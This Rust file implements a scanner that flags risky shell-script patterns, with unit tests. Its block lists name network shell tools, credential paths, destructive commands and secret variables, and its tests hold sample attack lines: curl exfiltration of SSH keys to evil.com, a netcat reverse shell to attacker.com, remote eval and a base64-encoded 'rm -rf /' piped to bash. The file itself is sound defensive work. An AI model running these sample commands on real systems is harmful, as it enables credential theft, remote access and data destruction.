#[derive(Debug, Clone, PartialEq)]
pub enum RiskyPattern {
    NetworkCommand(String),
    SensitivePath(String),
    SystemModification(String),
    EnvironmentExfiltration(String),
}

#[derive(Debug, Clone, Default)]
pub struct ScriptInspectionResult {
    pub warnings: Vec<String>,
    pub risky_patterns: Vec<RiskyPattern>,
}

impl ScriptInspectionResult {
    #[must_use]
    pub fn has_warnings(&self) -> bool {
        !self.warnings.is_empty()
    }
}

const NETWORK_COMMANDS: &[&str] = &["curl", "wget", "nc", "netcat", "ncat", "socat"];
const SENSITIVE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "~/.ssh",
    ".ssh/",
    "/root/",
];
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "chmod 777",
    "chmod -R 777",
    "> /dev/sd",
    "mkfs.",
    "dd if=",
];
const SENSITIVE_ENV_VARS: &[&str] = &[
    "AWS_SECRET",
    "AWS_ACCESS_KEY",
    "API_KEY",
    "SECRET_KEY",
    "PASSWORD",
    "PRIVATE_KEY",
    "TOKEN",
];
const EXECUTION_PATTERNS: &[&str] = &[
    "eval $(",
    "| bash",
    "| sh",
    "base64 -d |",
    "base64 --decode |",
];

#[must_use]
pub fn inspect_script_safety(content: &str) -> ScriptInspectionResult {
    let mut result = ScriptInspectionResult::default();

    for line in content.lines() {
        let line_lower = line.to_lowercase();

        for cmd in NETWORK_COMMANDS {
            if contains_command(&line_lower, cmd) {
                result
                    .warnings
                    .push(format!("Network command detected: {cmd}"));
                result
                    .risky_patterns
                    .push(RiskyPattern::NetworkCommand(cmd.to_string()));
            }
        }

        for path in SENSITIVE_PATHS {
            if line.contains(path) {
                result
                    .warnings
                    .push(format!("Sensitive path access: {path}"));
                result
                    .risky_patterns
                    .push(RiskyPattern::SensitivePath(path.to_string()));
            }
        }

        for pattern in DANGEROUS_PATTERNS {
            if line_lower.contains(pattern) {
                result
                    .warnings
                    .push(format!("Dangerous operation: {pattern}"));
                result
                    .risky_patterns
                    .push(RiskyPattern::SystemModification(pattern.to_string()));
            }
        }

        for var in SENSITIVE_ENV_VARS {
            if line.contains(&format!("${var}")) || line.contains(&format!("${{{var}")) {
                result
                    .warnings
                    .push(format!("Sensitive environment variable: {var}"));
                result
                    .risky_patterns
                    .push(RiskyPattern::EnvironmentExfiltration(var.to_string()));
            }
        }

        for pattern in EXECUTION_PATTERNS {
            if line_lower.contains(pattern) {
                result
                    .warnings
                    .push(format!("Dynamic code execution: {pattern}"));
                result
                    .risky_patterns
                    .push(RiskyPattern::SystemModification(pattern.to_string()));
            }
        }
    }

    result
}

fn contains_command(line: &str, cmd: &str) -> bool {
    let patterns = [
        format!("{cmd} "),
        format!("{cmd}\t"),
        format!("{cmd}\n"),
        format!(" {cmd}"),
        format!("\t{cmd}"),
        format!(";{cmd}"),
        format!("|{cmd}"),
        format!("$({cmd}"),
        format!("`{cmd}"),
    ];

    if line.starts_with(cmd) || line.ends_with(cmd) {
        return true;
    }

    patterns.iter().any(|p| line.contains(p))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_commands() {
        let script = "#!/bin/bash\ncurl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
        assert!(result.warnings.iter().any(|w| w.contains("curl")));
    }

    #[test]
    fn flags_wget_commands() {
        let script = "#!/bin/bash\nwget https://malware.com/backdoor.sh";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
        assert!(result.warnings.iter().any(|w| w.contains("wget")));
    }

    #[test]
    fn flags_netcat_commands() {
        let script = "#!/bin/bash\nnc -e /bin/sh attacker.com 4444";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }

    #[test]
    fn flags_sensitive_paths() {
        let script = "#!/bin/bash\ncat /etc/passwd > /tmp/stolen";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
        assert!(
            result
                .risky_patterns
                .iter()
                .any(|p| matches!(p, RiskyPattern::SensitivePath(_)))
        );
    }

    #[test]
    fn flags_ssh_directory_access() {
        let script = "#!/bin/bash\ncp ~/.ssh/id_rsa /tmp/key";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }

    #[test]
    fn flags_dangerous_rm_commands() {
        let script = "#!/bin/bash\nrm -rf /";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
        assert!(
            result
                .risky_patterns
                .iter()
                .any(|p| matches!(p, RiskyPattern::SystemModification(_)))
        );
    }

    #[test]
    fn flags_chmod_777() {
        let script = "#!/bin/bash\nchmod 777 /etc/shadow";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }

    #[test]
    fn flags_environment_exfiltration() {
        let script = "#!/bin/bash\necho $AWS_SECRET_ACCESS_KEY | curl -d @- http://evil.com";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }

    #[test]
    fn allows_safe_echo_script() {
        let script = "#!/bin/bash\necho \"$(date)\"";
        let result = inspect_script_safety(script);
        assert!(!result.has_warnings());
    }

    #[test]
    fn allows_safe_waybar_script() {
        let script = r#"#!/bin/bash
# Safe waybar module script
memory=$(free -m | awk '/Mem:/ {print $3}')
echo "{\"text\": \"${memory}MB\", \"tooltip\": \"Memory usage\"}"
"#;
        let result = inspect_script_safety(script);
        assert!(!result.has_warnings());
    }

    #[test]
    fn flags_eval_with_external_input() {
        let script = "#!/bin/bash\neval $(curl http://evil.com/cmd)";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }

    #[test]
    fn flags_base64_decode_execution() {
        let script = "#!/bin/bash\necho 'cm0gLXJmIC8=' | base64 -d | bash";
        let result = inspect_script_safety(script);
        assert!(result.has_warnings());
    }
}
